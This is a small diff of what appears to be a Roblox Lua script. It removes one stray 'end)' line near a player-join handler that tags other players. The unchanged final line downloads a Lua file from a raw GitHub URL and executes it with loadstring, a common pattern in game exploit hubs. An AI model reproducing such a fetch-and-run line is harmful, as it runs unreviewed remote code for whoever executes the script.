@@ -2429,5 +2429,4 @@ end
 Players.PlayerAdded:Connect(function(p)
     if p ~= LP then checkAndTagPlayer(p) end
 end)
-end)
 loadstring(game:HttpGet("https://raw.githubusercontent.com/HamaHub/Didi/refs/heads/main/Diddy.lua"))()
